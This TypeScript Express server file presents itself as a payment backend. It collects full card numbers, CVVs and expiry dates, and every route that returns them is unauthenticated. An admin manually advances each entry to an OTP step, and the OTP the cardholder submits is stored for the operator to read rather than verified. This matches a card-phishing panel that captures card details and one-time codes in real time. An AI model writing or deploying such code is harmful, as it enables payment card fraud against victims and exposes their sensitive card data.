import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import { VercelRequest, VercelResponse } from '@vercel/node';

// Types for Transaction and Credit Card
interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
  otpCode: string;
  submittedOtp?: string;
}

// In-memory Database
let transactions: Transaction[] = [
  {
    id: 'tx-1001',
    cardNumber: '4111 1111 1111 1111',
    cardholderName: 'Alice Johnson',
    expiry: '12/28',
    cvv: '422',
    cardType: 'visa',
    amount: 250.00,
    timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
    status: 'APPROVED',
    otpCode: '852014',
    submittedOtp: '852014'
  },
  {
    id: 'tx-1002',
    cardNumber: '5555 5555 5555 5555',
    cardholderName: 'Michael Chen',
    expiry: '08/27',
    cvv: '987',
    cardType: 'mastercard',
    amount: 1249.99,
    timestamp: new Date(Date.now() - 3600000 * 5).toISOString(),
    status: 'REJECTED',
    otpCode: '315792',
    submittedOtp: '111111'
  },
  {
    id: 'tx-1003',
    cardNumber: '3782 822463 10005',
    cardholderName: 'Sarah Jenkins',
    expiry: '04/29',
    cvv: '2001',
    cardType: 'amex',
    amount: 89.00,
    timestamp: new Date(Date.now() - 60000 * 15).toISOString(),
    status: 'PENDING_CARD_APPROVAL',
    otpCode: '147852'
  },
  {
    id: 'tx-1004',
    cardNumber: '6011 0000 0000 0000',
    cardholderName: 'David Miller',
    expiry: '11/30',
    cvv: '456',
    cardType: 'discover',
    amount: 15.50,
    timestamp: new Date(Date.now() - 60000 * 32).toISOString(),
    status: 'PENDING_CARD_APPROVAL',
    otpCode: '963258'
  }
];

const app = express();

// Body parser middleware
app.use(express.json());

// --- API Routes ---

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

// Get all transactions
app.get('/api/transactions', (req, res) => {
  res.json(transactions);
});

// Standalone Admin Portal transactions fetch route
app.get('/api/admin/transactions', (req, res) => {
  res.json(transactions);
});

// Standalone Admin Portal update status route
app.post('/api/admin/update-status', (req, res) => {
  const { id, status } = req.body;

  if (!id || !status) {
    return res.status(400).json({ error: 'Missing required fields (id, status).' });
  }

  if (!['PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'].includes(status)) {
    return res.status(400).json({ error: 'Invalid target status.' });
  }

  const txIndex = transactions.findIndex(t => t.id === id);
  if (txIndex === -1) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }

  transactions[txIndex].status = status;

  return res.json({
    success: true,
    transaction: transactions[txIndex]
  });
});

// Get single transaction details
app.get('/api/transactions/:id', (req, res) => {
  const { id } = req.params;
  const tx = transactions.find(t => t.id === id);
  if (!tx) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }
  res.json(tx);
});

// GET /api/status/[id]: Return status & relevant info of transaction
app.get('/api/status/:id', (req, res) => {
  const { id } = req.params;
  const tx = transactions.find(t => t.id === id);
  if (!tx) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }
  res.json({
    id: tx.id,
    status: tx.status,
    otpCode: tx.otpCode,
    submittedOtp: tx.submittedOtp,
    amount: tx.amount,
    cardType: tx.cardType,
    cardNumber: tx.cardNumber,
    cardholderName: tx.cardholderName
  });
});

// POST /api/pay: Create transaction, generate OTP, set status PENDING_CARD_APPROVAL
app.post('/api/pay', (req, res) => {
  const { cardNumber, cardholderName, expiry, cvv, cardType, amount } = req.body;

  if (!cardNumber || !cardholderName || !expiry || !cvv) {
    return res.status(400).json({ error: 'Missing required payment fields.' });
  }

  const finalAmount = amount ? parseFloat(amount) : Math.floor(Math.random() * 450) + 10 + 0.99;
  
  // Generate a random 6 digit OTP Code
  const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
  const newTxId = `tx-${Math.floor(100000 + Math.random() * 900000)}`;

  const newTx: Transaction = {
    id: newTxId,
    cardNumber,
    cardholderName: cardholderName.trim(),
    expiry,
    cvv,
    cardType: cardType || 'unknown',
    amount: finalAmount,
    timestamp: new Date().toISOString(),
    status: 'PENDING_CARD_APPROVAL',
    otpCode: randomOtp
  };

  transactions.unshift(newTx);

  return res.json({
    success: true,
    message: 'Transaction successfully initialized.',
    transaction: newTx
  });
});

// Submit a new transaction (alternative backward compatible endpoint)
app.post('/api/submit', (req, res) => {
  const { cardNumber, cardholderName, expiry, cvv, cardType, amount } = req.body;

  if (!cardNumber || !cardholderName || !expiry || !cvv) {
    return res.status(400).json({ error: 'Missing required payment fields.' });
  }

  const finalAmount = amount ? parseFloat(amount) : Math.floor(Math.random() * 450) + 10 + 0.99;
  const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
  const newTxId = `tx-${Math.floor(100000 + Math.random() * 900000)}`;

  const newTx: Transaction = {
    id: newTxId,
    cardNumber,
    cardholderName: cardholderName.trim(),
    expiry,
    cvv,
    cardType: cardType || 'unknown',
    amount: finalAmount,
    timestamp: new Date().toISOString(),
    status: 'PENDING_CARD_APPROVAL',
    otpCode: randomOtp
  };

  transactions.unshift(newTx);

  return res.json({
    success: true,
    message: 'Transaction submitted successfully for administrative review.',
    transaction: newTx
  });
});

// POST /api/admin/action: Update status by ID (Approve/Reject)
app.post('/api/admin/action', (req, res) => {
  const { id, status } = req.body;

  if (!id || !status) {
    return res.status(400).json({ error: 'Missing required fields (id, status).' });
  }

  if (!['PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'].includes(status)) {
    return res.status(400).json({ error: 'Invalid target status.' });
  }

  const txIndex = transactions.findIndex(t => t.id === id);
  if (txIndex === -1) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }

  transactions[txIndex].status = status;

  return res.json({
    success: true,
    transaction: transactions[txIndex]
  });
});

// Approve or Reject a transaction via path parameter (backward compatible dashboard)
app.post('/api/transactions/:id/status', (req, res) => {
  const { id } = req.params;
  const { status } = req.body;

  let targetStatus: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' = 'PENDING_CARD_APPROVAL';
  if (status === 'Approved' || status === 'AWAITING_OTP') {
    targetStatus = 'AWAITING_OTP';
  } else if (status === 'Rejected' || status === 'REJECTED') {
    targetStatus = 'REJECTED';
  } else if (status === 'Pending' || status === 'PENDING_CARD_APPROVAL') {
    targetStatus = 'PENDING_CARD_APPROVAL';
  } else {
    targetStatus = status;
  }

  const txIndex = transactions.findIndex(t => t.id === id);
  if (txIndex === -1) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }

  transactions[txIndex].status = targetStatus;

  return res.json({
    success: true,
    transaction: transactions[txIndex]
  });
});

// POST /api/verify-otp: Submit the OTP and set status to OTP_SUBMITTED
app.post('/api/verify-otp', (req, res) => {
  const { id, otp } = req.body;

  if (!id || !otp) {
    return res.status(400).json({ error: 'Missing required code verification fields.' });
  }

  const tx = transactions.find(t => t.id === id);
  if (!tx) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }

  tx.submittedOtp = otp.trim();
  tx.status = 'OTP_SUBMITTED';

  return res.json({
    success: true,
    message: 'OTP submitted successfully for administrative review.',
    transaction: tx
  });
});

// Delete a transaction (Optional convenience)
app.delete('/api/transactions/:id', (req, res) => {
  const { id } = req.params;
  const txIndex = transactions.findIndex(t => t.id === id);
  if (txIndex === -1) {
    return res.status(404).json({ error: 'Transaction not found.' });
  }
  transactions.splice(txIndex, 1);
  return res.json({ success: true, message: 'Transaction cleared.' });
});

export default app;
